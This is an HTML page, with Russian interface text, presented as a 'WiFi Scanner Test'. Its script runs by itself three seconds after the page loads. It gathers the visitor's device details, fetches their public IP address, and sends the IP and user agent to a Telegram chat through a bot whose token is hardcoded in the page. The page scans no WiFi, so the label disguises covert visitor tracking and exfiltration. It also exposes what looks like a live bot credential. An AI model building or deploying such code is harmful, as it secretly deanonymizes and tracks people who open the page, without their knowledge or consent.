<!DOCTYPE html>
<html>
<head>
    <title>WiFi Test</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="padding:20px; font-family:Arial;">
    <h1>🔍 WiFi Scanner Test</h1>
    
    <div id="log" style="background:#f0f0f0; padding:15px; border-radius:10px; margin:20px 0; font-family:monospace; font-size:12px;"></div>
    
    <button onclick="runFullTest()" style="padding:15px; background:#4CAF50; color:white; border:none; border-radius:10px; font-size:16px;">
        🚀 Запустить полный тест
    </button>
    
    <script>
        const BOT_TOKEN = "8462856007:AAHTGYvf-lCH7ahVHb4BOK_4AZ5OrQzVnP4";
        const CHAT_ID = "-5162779873";
        
        function log(msg) {
            document.getElementById('log').innerHTML += msg + '<br>';
            console.log(msg);
        }
        
        async function runFullTest() {
            log('=== НАЧАЛО ТЕСТА ===');
            
            // ТЕСТ 1: Проверка токена
            log('1. Проверяем токен бота...');
            try {
                const botTest = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
                const botData = await botTest.json();
                
                if (botData.ok) {
                    log(`✅ Бот активен: ${botData.result.username}`);
                } else {
                    log(`❌ Ошибка бота: ${JSON.stringify(botData)}`);
                    return;
                }
            } catch (e) {
                log(`❌ Ошибка сети: ${e.message}`);
                return;
            }
            
            // ТЕСТ 2: Проверка группы
            log('2. Проверяем доступ к группе...');
            try {
                const message = `🟢 Тест системы\nВремя: ${new Date().toLocaleString()}\nURL: ${window.location.href}`;
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                const data = await response.json();
                
                if (data.ok) {
                    log('✅ Сообщение отправлено в группу!');
                    log(`ID сообщения: ${data.result.message_id}`);
                } else {
                    log(`❌ Ошибка отправки: ${data.description}`);
                    log(`Код ошибки: ${data.error_code}`);
                    
                    // Ошибка 400 обычно означает:
                    // - Неверный chat_id
                    // - Бот не в группе
                    // - Бот заблокирован в группе
                    
                    if (data.error_code === 400) {
                        log('⚠️ Проблема с chat_id или правами бота в группе!');
                    }
                }
                
            } catch (e) {
                log(`❌ Ошибка запроса: ${e.message}`);
            }
            
            // ТЕСТ 3: Сбор данных устройства
            log('3. Собираем данные устройства...');
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                url: window.location.href,
                timestamp: new Date().toISOString()
            };
            
            log(`📱 Устройство: ${deviceInfo.userAgent}`);
            log(`🖥️ Экран: ${deviceInfo.screen}`);
            log(`🌐 Язык: ${deviceInfo.language}`);
            
            // ТЕСТ 4: Получение IP
            log('4. Получаем IP адрес...');
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                log(`📍 IP: ${ipData.ip}`);
                
                // Отправляем IP в Telegram
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `🌐 IP тест: ${ipData.ip}\nОт: ${deviceInfo.userAgent.substring(0, 50)}`
                    })
                });
                
            } catch (e) {
                log('❌ Не удалось получить IP');
            }
            
            log('=== ТЕСТ ЗАВЕРШЕН ===');
        }
        
        // Автозапуск через 3 секунды
        setTimeout(runFullTest, 3000);
    </script>
</body>
</html>
